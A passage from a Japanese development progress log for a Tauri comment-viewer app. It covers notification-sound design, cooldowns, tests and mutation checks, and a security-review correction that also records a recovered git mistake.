    ＝誰もサンプルを引かない＝「デバイスが stall した」状態を再現し、`wait_until_finished` が
    `PLAYBACK_GRACE` で必ず抜けることを実測する（＝invoke の Promise を永久未解決にしない）。
    ⚠ このテストだけ約 1 秒かかる（上限そのものを測るため。suite 全体 0.2s → 1.0s）。
  - 併せて波形テスト 3 本を **`ALL_SOUNDS` ループへ一般化**した。`sound_label` の `match` が exhaustive なので、
    **059 が variant を足すとコンパイルエラーになり、一覧への追加を忘れられない**（`error.rs` の `wire_name` と同じ idiom）。
    ＝059 が足す音も自動でクリップ・クリックノイズ・長さ整合の検査対象になる。
- **frontend +28 本（628 → 656）／新規 2 ファイル**:
  - `audioOutputApi.test.ts`（新規・`obsApi.test.ts` と同型）— command 名と**引数キーが camelCase であること**
    （`{ deviceId, sound }`。ここを間違えると実機でしか落ちない）／0 件は成功として透過／**reject を握り潰さない**／
    **ラッパは値を加工しない**（照合は Rust の仕事）／**失敗時に 2 回目を呼ばない**（既定へのリトライを作らない）。
  - `CommentViewerApp.audio.test.tsx`（新規）— 配線の仕様。設定を開くと列挙／再読み込みで再列挙／
    **列挙失敗を空配列で潰さない**／§9: 例外の中身（デバイス識別子・OSStatus）を画面に出さない／
    選択の保存と復元／⚠⚠ **一覧に無くても localStorage の保存値を消さない**（挿し直せば復帰）／
    テスト再生の引数／⚠⚠ **失敗しても既定デバイスで鳴らし直さない**／選び直しで失敗表示が消える／
    **未選択のあいだは再生 command を一度も呼ばない**／**設定を開くまで列挙もしない**。
  - `SettingsView.audio.test.tsx` +4 — 列挙失敗時は「見つかりません」を併記しない（取る行動が違う）／
    未選択なら警告を出さない／「未選択＝鳴らさない」を常に説明する／§8: **デバイス名を HTML として解釈しない**。
  - `audioOutputPrefs.test.ts` +4 — C1 制御文字（下記）／実在しうる記号は弾かない／
    save 側の trim ／一覧に無い ID も load はそのまま返す。
- **⚠ テストが仕様と実装の食い違いを 1 件炙り出したので実装を直した**:
  `audioOutputPrefs.ts` の doc は「**Rust 側も同じ検査で弾く**」と宣言しているのに、判定は
  `/[ -]/` で **C1 制御文字（U+0080..=U+009F）を通していた**。Rust は `char::is_control`
  なので C1 も弾く＝「frontend は保存を許すのに Rust が必ず拒否する」値が作れる状態（§8 の多層防御が片肺）。
  劣化方向は fail-closed なので危険ではないが、原因不明の「そのデバイスだけ鳴らない」になる。
  **広いほう（Rust）に合わせて** `/[ --]/` へ修正した。
- **`CommentViewerApp.toolbar.test.tsx` に `audioOutputApi` のモックを追加**（漏れの修正）。同ファイルは
  「マウント時に走る外部境界を全てモックして隔離する」方針だが、058a が足した境界が塞がれておらず、
  設定ビューへ移動するケースで**実 invoke が走っていた**（jsdom には Tauri が居ないので reject → 実装の
  `.catch` が握って表示が変わるだけでテストは通る＝気付けない）。
- **ミューテーション（10 件すべてレッド）**: Rust 6（検証削除／同期コマンド化／同時再生ガード削除／
  契約対象ファイルの取りこぼし／選択可否判定の無効化／判定の呼び出し削除）＋ frontend 4（列挙失敗を
  ready に潰す／一覧に無い保存値を消す／失敗時に既定デバイスで鳴らし直す／C1 判定を元に戻す）。
- **検証**: `cargo test` **154 passed** ／ `pnpm typecheck` / `lint` / `pnpm test` **656 passed**（35 files・
  CSS guard OK・version sync OK）。

## 2026-08-04 (059a 通知音の基盤＋コメント通知音 —— 音源 ID ごとに独立したクールダウン層と、鳴らせないことの継続表示)

依頼者の要望①「コメントが来たときに通知音（「ポン」というような音）を出す」を実装し、あわせて
[059b](tasks/059b-monetary-notification-sound.md)（投げ銭音）が乗る基盤を作った。
[058a](tasks/058a-audio-routing-foundation.md) が Rust 側の再生基盤を持っているので、059a は**その上に
「いつ・どの音を・何秒に 1 回まで鳴らすか」を載せるだけ**になった。着手前に
[059a](tasks/059a-comment-notification-sound.md) を **②-軽版へ全面的に書き直したうえで実装**した（058a と同じ作法）。

### ⚠ 旧 059a（Web Audio 前提）から失効していた記述

旧版は「音源を同梱して `decodeAudioData` し、専用 `AudioContext` と `GainNode` で鳴らし、autoplay 対策に
`resume()` を配線する」計画だった。058s の実測（webview では出力デバイスを選べない）で**再生層が Rust へ移った**ため、
次がすべて失効していた。**着手前に一覧化して本人と突き合わせた**（本人の整理 5 件を追認し、こちらで 9 件追加した）。

- 音源の同梱（base64 / `src/assets/`）→ **Rust でトーン合成**。同梱ファイルもパスも存在しない。
- 専用 `AudioContext` / `decodeAudioData` キャッシュ / `GainNode` / `suspended` の扱い / `resume()` の配線 → **全部不要**。
- 「058a の `applyRoute(ctx, route)` を設定変更のたびに呼ぶ」→ **`applyRoute` は 058a 旧版の API で実在しない**。
- `sound-volume` / 「音量スライダーは出す」→ **出さない**（根拠が Web Audio 前提で失効・下記）。
- `sound-comment-stream-output`（配信に載せるか）→ **作らない**（②-軽では「載らない」で固定済みでトグルの余地が無い）。
- 完了条件の「`suspended` で例外を投げない」「音源のライセンス確認」「**Rust / 依存は差分ゼロ**」
  → 前 2 つは削除、3 つ目は「**Rust には差分が出る／依存・capabilities・`tauri.conf.json` は差分ゼロ**」へ訂正。
- レビュー節の「**frontend のみ**だから軽レビュー」→ 理由が失効したので**レビュー必須条件に照らして判定し直した**（下記）。

### 音の作り方 —— 道①（Rust でトーン合成）を採用。**ライセンス確認の論点は消えた**

058a が申し送った 3 つの道のうち **①エンベロープ付きトーン合成**を採った（本人決定）。

- **道②（`include_bytes!` で生 PCM）を見送った理由**: 守りたい不変条件は「frontend から任意のパス／バイト列を
  受け取らない」であって「ビルド時に固定バイト列を焼かない」ではない——という整理自体は正しいが、
  契約テスト `accepts_no_file_path_from_the_frontend` の needle を外す＝**セキュリティ契約を触る変更**なので、
  1 音足すだけの作業に security-review 級の判断がぶら下がる。得られるのは音色の自由度だけで割に合わない。
- **道③（WAV 同梱）を見送った理由**: `wav` feature ＝ +symphonia 4〜5 crate ＝ 059 の「新規依存ゼロ」方針の変更。
  要望は「コメントが来たと気づける」であって「良い音を鳴らす」ではない。
- ⚠ **音は第三者素材ではなくアプリ内合成**なので、**配布バイナリに他人の著作物が入らず、ライセンス確認は不要**。
  059 が親から引き継いでいた「音源のライセンスを確認して記録する」という宿題は、道①を採ったことで**消滅した**
  （059b も同じ道を採るなら同様。⚠ 既製音源を使いたくなったら道③＝依存追加＋ライセンス確認が復活する）。

**`Test` と `Comment` は別の音にした。** 設定画面に「テスト再生」（058a・出力先の検証）と「試聴」（059a・音の確認）の
2 つのボタンが並ぶので、同じ音だと「どちらを押したか分からない」＝テスト再生の診断価値が落ちるため。

| 音 | 周波数 | 長さ | 減衰時定数 |
| --- | --- | --- | --- |
| `Test`（既存） | 880 Hz (A5) | 180 ms | 60 ms |
| **`Comment`（059a）** | **660 Hz (E5)** | **140 ms** | **23 ms** |

`ToneSpec` に `decay_tau: Duration` を 1 フィールド足し、`samples_for` の tau 導出を「`duration / 3` 固定」から
spec の値へ変えた（1 行）。**長さと余韻を独立に決められる**ようにするためで、これが無いと
「短くて余韻の速い『ポン』」が作れない（058a の固定式では長さを変えないと余韻が変えられなかった）。

- ⚠ **`Test` の波形は「同じ狙いの値」だが f32 ビット単位では一致しない**（計画時に「1 サンプルも変わらない」と
  書いたが**実測で誤りと判明したので訂正した**）。`0.18f32 / 3.0` = 0.060000002 に対し
  `Duration::from_millis(60).as_secs_f32()` = 0.059999999 で**最下位ビット 1 つ分**ずれる。相対誤差 6e-8 ＝
  サンプル値の丸め幅より小さく可聴差は無いので受容した。完全一致にこだわって `duration / N` の形に戻すと
  **長さと余韻を独立に決められなくなる**（decay_tau を spec 側へ出した目的そのものが失われる）。
- ⚠ 純正弦波なので木琴のような「ポン」そのものにはならない。**再修正トリガー＝実機で「ポンに聞こえない」と
  感じたとき**。そのとき倍音（オクターブ上を低振幅で加算）を検討する（重みの和を 1 以下にすればクリップ不変条件は保たれる）。

### 音量 —— **出さない**（旧版の「音量スライダーは出す」を反転）

旧 059a は「通知音は『うるさい／小さすぎ』が使用可否に直結するので固定音量では実用にならない」と書いていたが、
**その根拠は Web Audio 前提で失効している**。旧案は読み上げと通知音が**同じ出力先**（`ctx.destination`）へ出るので
OS 音量を下げると読み上げも一緒に下がり、アプリ内の相対音量調整が要る、という構図だった。②-軽では
**通知音だけがユーザーの選んだ実デバイス**へ出て読み上げは OS 既定へ出るので、
**OS のデバイス別音量が通知音だけに独立して効く**（macOS＝出力デバイスごとの音量 / Windows＝音量ミキサー）。
加えて振幅は Rust の `PEAK_AMPLITUDE` 固定で、frontend にキーだけ作っても**何も効かない**。

- 副次的に UI 形態の問題も消えた（`type="range"` は**このアプリに前例ゼロ**で CSS 差分が出る。
  `type="number"` なら乗れるが「音量を数値で入力する」は体験が悪い）。**CSS 差分ゼロ**を維持できたのはこの判断のおかげ。
- **再修正トリガー**: 実機で「小さすぎ／大きすぎ」なら**まず `PEAK_AMPLITUDE` を調整する**
  （1 行・コマンドの引数面は増えないのでレビュー区分も不変）。それでも足りず「デバイスや配信ごとに変えたい」と
  なったら**別タスクへ切り出す**——必要なのは「Rust の引数追加＋§8 のクランプ（NaN / Inf / 範囲外）＋
  `every_sound_never_clips` の書き換え＋**security-review**」のセットで、059a のスコープではない。

### クールダウン —— **音源 ID ごとに独立**・コメント音は 600ms

`notificationSound.ts`（新規）が `Record<NotificationSound, number>`（値）と `Map<NotificationSound, number>`（最終要求時刻）を持つ。

- ⚠⚠ **共有カウンタにしない。** 共有すると 059b で「コメントが流れている最中のスパチャ音がコメント音の
  クールダウンで消える」＝**一番気づいてほしい音が鳴らない**という最悪の挙動になる。059b は `COOLDOWN_MS` に
  `monetary` の行を足すだけで乗る。⚠ `Record<NotificationSound, number>` なので、Rust に variant を足すと
  **ここが型エラーになる**（追加漏れ不能＝Rust の `ALL_SOUNDS` / `sound_label` と同じ idiom）。
- **600ms の根拠**: ①**下限は Rust の占有時間で決まる**——コメント音は 140ms ＋ `PLAYBACK_TAIL`(80ms) ＝ **約 220ms**
  のあいだ `PLAYING` が立つので、これより短いと「**クールダウンは通ったのに Rust に黙って捨てられる**」状態になり、
  クールダウンが効いていないのに音だけ減る、という読み解けない挙動になる（220ms の 2 倍以上の余裕を取った）。
  ②**上限は体験で決まる**——1 秒あたり最大 1〜2 回で、気づく目的には十分でうるさくない。
  ③投げ銭音は独立なのでスパチャの検知を遅らせない。⚠ **実機で調整する余地あり**（本人の手番）。
- ⚠ **時刻は「invoke を投げた時点」で記録する（成否を待たない）**。`play_notification_sound` は鳴り終わってから
  resolve するので、解決を待つとクールダウンが再生時間ぶん伸びて意味がぶれる。**失敗しても記録する**＝
  デバイスが抜けている間 invoke を撃ち続けない（Rust は呼ばれるたびに出力デバイスを再列挙するため）。
- ⚠ **Rust の「同時再生 1 本」とは役割が違う**（コードコメントに表で明記した）: あちらは
  **可用性（自己 DoS）対策**で音の種類に関係なく全体で 1 本・**外さない・緩めない**（レビュー必須条件）。
  こちらは**体験（うるささ）対策**で音源ごとに独立・調整可。059a 側は Rust の上限に**到達させないための上流の絞り**でもある。

### 「鳴らせなかった」ことの継続表示 —— 058a が 059 へ投げた宿題への回答

⚠⚠ **これが無いと、配信中にデバイスを抜いたとき黙って鳴らなくなる。** 058a は fail-closed かつ
ホットプラグ監視を持たない（設定画面を開いた時にしか突き合わせない）ので、ここが唯一の気付ける経路。

- **置き場所とクラスは 045c の OBS エラーと同じ**（ツールバーの `.toolbarError` ＋ `title` で全文）＝**CSS 差分ゼロ**。
  性質が同じ（**ユーザー操作なしに起きた失敗**を配信中の画面へ出す）ため。設定カード内の `.errorText`
  （＝押したボタンの結果＝`audioTestState`）とは別物、という整理。
- 文言は「**通知音を再生できません**」＋ title「通知音の出力先が見つかりません。設定の「音声出力（通知音）」で
  デバイスを選び直してください。」⚠ **デバイス名・デバイス ID・例外の中身を出さない**（§9・テストで固定）。
- 表示条件は `soundCommentEnabled && notificationSoundFailed`（045c の `obsAutoAdd &&` と同じ非対称ゲート＝
  **OFF のときは出さない**。鳴らないのが正常な状態で赤字を出さない）。
- 消えるのは①次の再生が成功②デバイスを選び直した③試聴が成功④OFF にした、の 4 経路。
  ⚠ **時間経過では消さない**（気付かせるのが目的なので、放っておいて消えたら意味がない）。
  ⚠ **クールダウンで鳴らさなかっただけ（`"skipped"`）では消さない**——skip は故障ではないが回復でもないので、
  ここで消すと「まだ直っていないのに直ったように見える」。テストで固定した。
- ⚠ **エラーコードで分岐しない。** `AUDIO_DEVICE_UNAVAILABLE` と `AUDIO_PLAYBACK_FAILED` はユーザーが取る行動が
  同じ（設定でデバイスを選び直す）ため、**reject したという事実だけ**を見る。コードを読むと例外オブジェクトの
  中身に触れる経路ができ、§9 に対して余計な面が増える。

### 設定 UI —— 新カード「通知音」（CSS 差分ゼロ）

読み上げ（VOICEVOX） → 音声出力（通知音） → **通知音** の並び（「どこへ出すか」→「何を鳴らすか」）。
カードを分けたのは **058a のカードのコメント自身**が「ここが担うのは出力先だけで、通知音の ON/OFF・音量・種類は
059 がそれぞれの機能の隣に置く」と宣言していたため。059b は同じカードに投げ銭音を 1 組足せる。

- ⚠ **出力先が未選択でもトグルを `disabled` にしない。** 既存の disabled 先例（`ttsEnabled=false` で source トグルを
  無効化）は**同一カード内の上位トグル**という直接的な関係だが、ここは**別カードの状態に依存**するので
  押せない理由が画面から読めない。「先に ON にしてから出力先を選ぶ」順序を禁止する理由も無い。
  代わりに **ON かつ未選択のときだけ**理由を文章で出し、**試聴ボタンだけ** disabled にした。
- ⚠ 「保存済みデバイスが見つからない」ときは**このカードでは何も言わない**（058a のカードの担当）。
  両方出すと**同じ状態を 2 つの違う言葉で二重に叱る**ことになり、かつ「未選択」は事実として誤り。
  判定に生の `audioOutputDeviceId` を使うことでこれを成立させている（列挙中に一瞬赤くならないのも同じ理由）。
- ⚠ ON/OFF をツールバーへ置かなかった理由＝通知音は「一度 ON にしたらそのまま」寄りの設定
  （045b がツールバーへ移したのは配信中に頻繁に切り替える操作）。右クラスタは既にトグル 2＋ボタン 2 で、
  059b が来ると 4 トグルになり狭窓で崩れる。**再修正トリガー＝実機で「配信中に頻繁に切りたい」と感じたとき。**

### 実装で効いた設計判断

- **1 バッチ 1 回。** `mergeComments` の `added` が 20 件でも再生要求は 1 回。⚠ これは
  「クールダウンが潰してくれるから結果的に 1 回」ではなく**意図としてコードで 1 回に決めている**（下記テスト参照）。
- ⚠ **`updated`（043e の Jewels combo 更新）では鳴らさない**（`added` しか渡さないことで守る）。
- ⚠ **ref を 2 本使った**（`soundCommentEnabledRef` / `audioOutputDeviceIdRef`）。state を直接 `useCallback` の
  依存に入れるとコールバックが作り直され、それを依存に持つ **WS 接続 effect が張り直されて「窓内 WS 1 本」の
  原則に反する**（`ttsEnabledRef` / `speakTwitchRef` と同じ理由）。
- ⚠ **StrictMode の updater 二重実行**: `main.tsx` は `<React.StrictMode>` なので dev では updater が 2 回走る。
  `enqueueForSpeech` は `seenIds`、`recordComments` は `INSERT OR IGNORE` で冪等だが、**通知音は構造的には
  冪等でない**。1 回で済むのは同一 tick の 2 回目が必ずクールダウンに当たるため＝**クールダウンが冪等化も
  担っている**。偶然に見えて設計なので、コメントに明記し**テストで固定した**。
- ⚠ **試聴はクールダウンを通さない**（ユーザーの明示操作にレート制限をかけると「押したのに鳴らない」＝壊れて見える。
  034c の話者試聴と同じ）。連打は「再生中は disabled」で抑える＝058a のテスト再生と同じ形。

### テスト

- **新規 4 ファイル**: `notificationSound.test.ts`（11）／`soundPrefs.test.ts`（11）／
  `CommentViewerApp.notificationSound.test.tsx`（14）／`SettingsView.audio.test.tsx` に `describe("SettingsView 通知音")` を追記（10）。
- ⚠⚠ **モックの掛け方がこのタスクで一番効いた設計判断**。`CommentViewerApp` 側は `notificationSound` を
  **実装を素通しする spy**（`vi.mock` + `importOriginal`）にして、**クールダウンより手前**の呼び出し回数を数える。
  `audioOutputApi` だけをモックして invoke 回数を数えると、「1 バッチ 1 回」を `added.forEach` に書き換える
  ミューテーションを入れても**クールダウンが下流で 1 回に潰してしまい、テストが緑のまま通る**
  （実際にミューテーション②で**下流のテストが緑のままだったこと**を確認した）。
  ⚠ `beforeEach` で `mockReset()` を使わないこと（実装ごと消えて素通しでなくなる）。`mockClear()` を使う。
- ⚠ **テストが 1 件空振りだったので書き直した**: 「通知音を OFF にすると継続表示が消える」を設定ビューを
  開いたまま assert していたが、**設定ビューはツールバーごと差し替わる**ので、トグルの状態と無関係に消えて
  必ず緑になっていた。**コメント画面へ戻ってから確認する**形に直し、さらに「トグルを触らず往復しただけでは
  消えない」ケースを足して**空振りでないこと自体を担保**した。
- **Rust**: `ALL_SOUNDS` に `Comment` を足したので**波形の不変条件テスト 3 本が自動で新しい音にも適用される**
  （クリップしない／無音で始まり無音で終わる／宣言長と実サンプル数が一致）。追加 1 本＝
  **`tone_spec` の (周波数, 長さ) が全 variant で一意**（⚠「耳で聞き分けられる」の証明ではなく、
  アームをコピペして値を変え忘れる事故を止めるだけ。聞き分けは実機確認項目）。
- **ミューテーション（3 件すべてレッド）**: ①クールダウン判定の比較演算子を反転 → **4 件レッド**
  ②「1 バッチ 1 回」を `added.forEach` に書き換え → **1 件レッド**（⚠ 下流の invoke カウントは緑のまま）
  ③未選択ガードを外して既定デバイスへ落とす → **15 件レッド**。
- ⚠ テスト内の `panic!` は `assert!` に書き換えた（同ファイルの他テストと形を揃え、`audio/` を grep したときの
  見た目も汚さないため。契約テスト `has_no_panicking_paths` は `#[cfg(test)]` 以降を除去するので元々緑だった）。

### レビュー区分の判定 —— **軽レビュー**（条文に照らし直した）

旧 059a の理由（「frontend のみ・新規通信ゼロ・新規依存ゼロ」）は **`src/audio/` に差分が出るので失効**している。
そこで `docs/security.md`「レビュー必須条件」の**「音声デバイスの列挙・音声の再生」の 5 つの下位条件**に当てはめ直した。

| 下位条件 | 該当 | 根拠 |
| --- | --- | --- |
| 列挙対象を**出力デバイス以外へ広げる**（＝マイクに触れる） | ✕ | `list_output_devices` 差分ゼロ・`never_touches_input_devices` 無改変 |
| 再生できる音を **enum 以外**（パス・バイト列・URL）で指定できるようにする | ✕ | 指定経路は `NotificationSound` のまま。道①なので `include_bytes!` も無し |
| **既定デバイスへフォールバックする**向きの変更 | ✕ | `find_output_device` 差分ゼロ・frontend も未選択なら呼ばない |
| **同時再生の上限を外す・緩める** | ✕ | `PLAYING` / `PlaybackGuard` / `only_one_playback_runs_at_a_time` 無改変 |
| `NotificationSound` の variant に**ペイロードを持たせる** | ✕ | `Comment` は unit variant |

**5 つとも非該当。** とくに 5 番目が「**ペイロードを持たせる変更**」を名指ししていることは、
**ペイロードなしの variant 追加が想定内の安全な増やし方**であることの反対解釈になる（058a の申し送り
「音を増やすのは variant を足すだけ」と、`ALL_SOUNDS` / `sound_label` の追加漏れ検知テストがその前提で設計されている）。
⚠ **ただし親項目の文言は「音声デバイスの列挙・音声の再生」と広く、`src/audio/` に差分が出るのは事実**なので、
**軽レビューの観点に 3 点を明示的に持ち込む**ことにした: ①契約テストが 1 本も緩んでいない
②`ALL_SOUNDS` / `sound_label` が更新されている ③fail-closed が frontend 側でも守られている。
⚠ **音量引数を将来採るなら security-review 必須**（§8 の検証面が広がり `every_sound_never_clips` の前提が動くため）。

`docs/security.md` は**方針・レビュー必須条件を変更していない**。§4 追補の「（058a は「テスト音」1 種）」という
**事実の記述だけ**が古くなるので 1 行訂正した。

### 変更ファイル

- **Rust（2）**: `src/audio/model.rs`（`NotificationSound::Comment` ＋「ペイロードを持たせるな」の注記）／
  `src/audio/service.rs`（`ToneSpec.decay_tau` ／ `tone_spec` に 1 アーム ／ `samples_for` 1 行 ／
  テストの `ALL_SOUNDS`・`sound_label`・`every_sound_has_a_distinct_tone`）。
  `bindings/NotificationSound.ts` は **ts-rs が再生成**（`"test" | "comment"`）。
- **frontend 新規（5）**: `notificationSound.ts` ＋ テスト ／ `soundPrefs.ts` ＋ テスト ／
  `CommentViewerApp.notificationSound.test.tsx`。
- **frontend 変更（4）**: `CommentViewerApp.tsx`（state 3・ref 2・save/同期 effect 3・`playCommentNotification`・
  受信 effect 1 行・試聴ハンドラ・ツールバー indicator・props 4）／`SettingsView.tsx`（通知音カード新設）／
  `SettingsView.audio.test.tsx`（`baseProps` ＋ 059a の describe）／`SettingsView.obs.test.tsx`（`baseProps` に新 props）。
- **docs（4）**: `059a`（**②-軽版へ全面書き直し**）／`progress.md`（本エントリ）／`task-board.md`／
  `security.md`（**§4 追補の事実 1 行のみ**）。

### ゼロ拡大の実測

`capabilities/` ／ `tauri.conf.json` ／ `Cargo.toml` ／ `Cargo.lock` ／ `package.json` ／ `pnpm-lock.yaml` ／
`apps/comment-sidecar/` ／ `.github/` ／ **`CommentViewerApp.module.css`（CSS 差分ゼロ）** ／
`ttsQueue.ts` ／ `voicevox.ts` ／ `voicevoxPreview.ts` ／ `audioOutputApi.ts` ／ `audioOutputPrefs.ts` ／
`audio/commands.rs` が**すべて差分ゼロ**。`csp: null` 不変・外部通信ゼロ・新規依存ゼロ。

### 検証

`cargo check` OK ／ `cargo test` **155 passed**（059a の新規 1 本＝`every_sound_has_a_distinct_tone`。
既存の波形テスト 3 本は `ALL_SOUNDS` 経由で `Comment` にも自動適用）／`typecheck` OK ／ `lint` OK ／
`pnpm test` **702 passed**（38 files・059a の新規 46 本。CSS guard OK・version sync OK）。

### ⚠ 実機確認は未実施（本人の手番）

`tauri dev` で: ①「通知音」カードが出る（既定 OFF）／試聴で鳴る／**058a のテスト再生と聞き分けられる**
②1 件で 1 回鳴る ③連投で鳴りっぱなしにならない（**クールダウン 600ms は実機で調整してよい**）
④Jewels combo 更新では鳴らない ⑤未選択のあいだは鳴らない（既定へ落ちない）
⑥**デバイスを抜くとツールバーに「通知音を再生できません」が継続表示され、挿し直すと消える**
⑦読み上げと同時に鳴っても互いを止めない ⑧ライト／ダーク両テーマ
⑨OBS の音声入力キャプチャで仮想デバイスを拾うと読み上げは載り通知音は載らない。

### やらないこと（線引き）

投げ銭通知音（059b）／出力デバイスの選択・列挙（058a 完了済み・差分ゼロ）／「配信に載せる」トグル（②-軽で成立しない）／
音量 UI（上記・再修正トリガーあり）／読み上げの変更（差分ゼロ）／同時再生 1 本の上限の変更（外さない）／
ユーザー音源の差し替え（将来）／コメント内容による出し分け／視覚エフェクト（061）／ホットプラグ監視（**継続表示で代替**）／
コミット・プッシュ（**本人の明示指示待ち**）。

## 2026-08-04 (059a レビュー対応 —— レビュー区分の判定を是正し、空振りテストと消え残る indicator を直した)

059a の実装に対して **security-review ＋品質レビュー**を実施し、その指摘へ対応した（`apply-review`）。

### ⚠⚠ 一番大きな指摘: **レビュー区分の判定そのものが誤っていた**

059a は「レビュー必須条件の**5 つの下位条件がすべて非該当**だから軽レビュー」と判定していたが、
**これは誤りだった**。下位条件は「**該当する例**」の列挙であって、**本項のスコープの定義ではない**
（いずれも「〜する変更は本項に必ず該当する」「〜も同様」「〜に含む」という**包含の宣言**の形をしている）。
親項目の文言は「**音声デバイスの列挙・音声の再生**」と広く、059a は

- `NotificationSound` に variant を足した＝**鳴らせる音の集合を変えた**
- `samples_for` の減衰時定数の導出を書き換えた＝**既存の Test 音を含む全再生波形の生成ロジックに触れた**

ので、素直に本項に該当する。とくに **5 番目の「ペイロードを持たせる変更」を反対解釈の根拠に使ったのが誤り**
——あの条文の役割は「契約テストの `PathBuf` needle で捕まらない抜け道を条文で塞ぐ」ことであって、
それ以外の `audio/` 変更を免除することではない。

**046a とまったく同型の誤り**である（§9 追補 046a に「046a は当初『軽レビュー』指定だったが…
frontend のみ・通信ゼロでも保存ポリシーに触れる変更はレビュー必須として扱うこと」と既に記録されている）。
このリポジトリの規範は**「列挙された項目に触れるなら、下位条件の当てはめで自分を免除しない」**であり、
それを 2 度目に踏んだ形になる。

- **セキュリティ実体の逸脱はゼロ**（レビュー結果＝修正必須 0 件）。軽レビューでも見るべき 3 点
  （契約テスト・追加漏れ検知・fail-closed）は実際に持ち込まれていたので、判定ミスが見落としには直結しなかった。
- **再発防止として `docs/security.md` の「レビュー必須条件」に条文を 1 つ追記した**（⚠ **今回はじめて
  「レビュー必須条件」本体に手を入れた**——これまでの 059a は §4 追補の事実 1 行しか触っていない）:
  **「`src-tauri/src/audio/` の本番コードに差分が出る変更は、下位条件のどれにも当たらなくても本項に該当する」**。
  **禁止しているものは 1 つも減っていない**（対象を広げる方向の追記であって、緩和ではない）。
- ⚠ **059b も同じ理由で security-review 必須**へ変更した（task-board.md の 059b 行）。

### 品質指摘のうち、コードを直したもの（4 件）

- ⚠⚠ **(Q-1) StrictMode のテストが空振りしていた。** 「同じバッチで `onComments` が 2 回走っても invoke は 1 回」
  として `receive(batch)` を 2 回呼んでいたが、それでは `mergeComments` が id で dedup して 2 回目の `added` が
  空になり、`playCommentNotification` が `added.length === 0` で早期 return するだけだった
  ＝**クールダウンを 0 にしても緑のまま通る**。主張していた「クールダウンが冪等化も担っている」を
  **何も固定していなかった**。本物の経路（`onComments` は 1 回だが `setComments` の updater が 2 回走る）へ
  書き直し、`<React.StrictMode>` で包んで「requestNotificationSound は 2 回・playNotificationSound は 1 回」を
  固定した。**クールダウンを 0 にするミューテーションで赤になることを実測**（以前は緑だった）。
  dedup 側の防波堤は別テストとして分離した（どちらが効いているのか取り違えないため）。
  ⚠ StrictMode は effect を mount → cleanup → mount と走らせるので、`connectCommentStream` のハンドラは
  **最後の呼び出し**から取る必要がある（`receive` ヘルパを修正）。
- **(Q-2) 058a の「テスト再生」が成功しても継続表示が消えなかった。** `handleTestNotificationSound` の
  成功時に `setNotificationSoundFailed(false)` を 1 行足した。**同じデバイスを抜いて挿し直した**場合は
  選択が変わらないので `handleAudioOutputDeviceIdChange` が発火せず、しかも赤字の `title` が名指しで
  案内しているのは 058a のカード＝**一番踏まれやすい導線だけが効かない**配置になっていた。
  鳴らす経路には触れない（表示 state を畳むだけ）ので fail-closed には影響しない。
  ⚠ 「058a のコードは原則無改変」というタスク上の制約で保留していたが、その制約の趣旨は
  「058a のロジックを弱めない」ことなので、`handleAudioOutputDeviceIdChange` への 2 行追記と同じ性質と判断した。
- **(Q-3) テストのモック seam を堅牢化した。** `mocks.requestNotificationSound.mockImplementation(actual.…)` は
  `mockReset()`（や vitest 設定の `mockReset: true`）で**実装ごと消えて素通しでなくなる**ため、
  ⚠ コメントで「`mockClear()` を使うこと」と運用注意を書いていた。**spy を「記録専用」にして実装は毎回
  `actual` を直接呼ぶ形**へ変更し、リセットの仕方に依存しなくした（運用注意を 1 つ減らせた）。
- **(Q-9) `SoundPreviewState` と `AudioTestState` の取り違えを殺す配線テストを追加した。**
  両者は構造的に同一なので props を入れ替えても typecheck は通り、SettingsView 単体テストでも捕まらない。
  branded type は**採らなかった**（前例が無く、状態集合は今後も一致する公算が高い＝書式コストだけ払って
  意味が増えない）。代わりに「試聴の失敗が 058a のカードへ漏れない」を CommentViewerApp レベルで直接固定した。

### 文言の訂正（2 件）

- **継続表示の `title` から原因の断定を外した。** 「通知音の**出力先が見つかりません**」は
  `AUDIO_DEVICE_UNAVAILABLE` を前提にした書き方だが、`AUDIO_PLAYBACK_FAILED`（デバイスは在るが
  ストリームが開けない）でも同じ表示になる。**エラーコードで分岐しない**判断（§9 の面を増やさない）は
  維持したまま、**ユーザーが取れる行動**（選び直す・再読み込みする）だけを書く形へ。
- **「配信には載りません」を断定から条件付きへ**（058a・059a の両カードの `.note`）。
  真なのは「配信に流していない**実**デバイスを選んだ場合」だけで、同じカードが案内している
  仮想オーディオデバイスをここで選べば載る。「何を選べばよいか」を同時に伝える形に揃えた。

### 受容し、コメントで固定した指摘（再修正トリガー付き）

- **時間ベースの冪等化への依存**（StrictMode の 2 回目をクールダウンが潰している）。構造的な冪等化ではなく、
  クールダウンを 0 にすると dev で 2 回鳴る結合が残る。⚠ **再修正トリガー＝クールダウンを 250ms 未満まで
  下げたくなったとき／副作用呼び出しを updater の外へ出すとき**（そのときは `lastNotifiedIdRef` で id ベースの
  冪等化にする）。
- **飛行中の要求が「対処済み」を上書きしうる**（デバイスを選び直した直後に、それ以前の要求が reject する）。
  世代カウンタは複雑さに見合わないと判断。
- **`"played"` は実再生を保証しない**（Rust の同時再生 1 本に競合した呼び出しは鳴らさず `Ok(())` で返る）。
  fail-closed は壊れないので受容。⚠ 戻り面を変えるならレビュー必須条件に該当する。
- **クールダウン 600ms の下限根拠が楽観的だった。** 「140ms ＋ `PLAYBACK_TAIL` 80ms ＝ 約 220ms」は
  **下限であって実測値ではない**——`PLAYING` が立つのは `play_on_device` の**先頭**からなので、
  実際にはデバイスの再列挙（数十〜数百 ms）とストリーム open とポーリング粒度 10ms が乗る
  （逆に `Player::empty()` は 50ms 早く抜けうる）。実占有は概ね **150〜350ms**。
  600ms は依然として安全側だが、⚠ **実機で下げるときも 250ms は下回らないこと**とコメントに明記した。
- **モジュールスコープの `Map`**（webview は窓ごとに独立した realm ＋通知音はコメビュ窓でしか鳴らない）／
  **test-only export**（引数なしの `Map.clear()` で本番から呼ばれても無害）／
  **`mergeComments` の `added` の既知性質**（クランプで落ちた jewels 行の再出現。⚠ **059b では意味が変わる**ので
  task-board.md の申し送りに追記）／**indicator がコメント画面にしか出ない**割り切り。

### ⚠ 作業事故と復旧（記録として残す）

ミューテーション検証の後始末に `git checkout -- CommentViewerApp.tsx` を使い、**未コミットの 059a 実装を
丸ごと消した**（tracked ファイルなので HEAD へ戻る）。レビュー時に取得済みの `git diff` 全文から復元し、
`typecheck` / `lint` / `pnpm test`（705 passed）と**追加行の突き合わせ**で同一性を確認した。
⚠ **未コミットの作業ツリーでミューテーションを試すときは、`git checkout` ではなく
「変更した箇所を手で戻す」か「ミューテーションを当てる前にコピーを取る」こと。**

### 検証

